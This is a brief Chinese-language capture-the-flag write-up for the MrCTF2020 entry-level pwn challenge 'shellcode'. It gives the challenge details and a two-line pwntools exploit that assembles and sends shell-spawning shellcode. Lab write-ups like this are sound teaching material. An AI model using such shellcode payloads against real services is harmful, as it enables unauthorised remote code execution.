
## shellcode
- 题目描述：
    
    > zaima, 有人想试试你的shell麦吉克
- 题目附件：[shellcode](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MrCTF2020/pwn/shellcode/shellcode)
- 考察点：shellcode
- 难度：入门
- 初始分值：500
- 最终分值：120
- 完成人数：47

### 程序分析
没啥好分析的，输入shellcode即可。

### exp
```python
payload = asm(shellcraft.sh())
sl(payload)
```

